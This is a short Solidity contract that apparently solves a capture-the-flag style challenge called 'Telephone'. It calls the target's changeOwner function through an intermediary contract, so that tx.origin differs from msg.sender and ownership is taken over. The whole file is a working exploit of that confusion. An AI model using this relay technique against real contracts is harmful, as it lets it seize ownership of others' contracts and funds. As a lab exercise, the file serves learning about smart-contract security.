// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./Telephone.sol";

contract Level4 {
    Telephone telephoneContract;

    constructor(address telephoneAddr) public {
        telephoneContract = Telephone(telephoneAddr);
    }

    function main() public {
        // msg.sender will be this contract, but tx.origin will be my address
        telephoneContract.changeOwner(tx.origin);
    }
}
